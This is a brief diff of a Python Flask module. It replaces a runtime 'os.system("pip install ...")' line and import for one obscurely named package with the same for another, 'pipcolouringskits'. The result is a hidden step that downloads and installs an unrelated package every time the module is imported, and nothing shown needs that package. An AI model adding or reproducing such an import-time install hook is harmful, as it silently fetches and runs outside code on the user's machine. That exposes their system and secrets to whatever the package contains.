@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install sysfontinglib")
-import sysfontinglib
+os.system("pip install pipcolouringskits")
+import pipcolouringskits
 import flask
 
 from flask import g
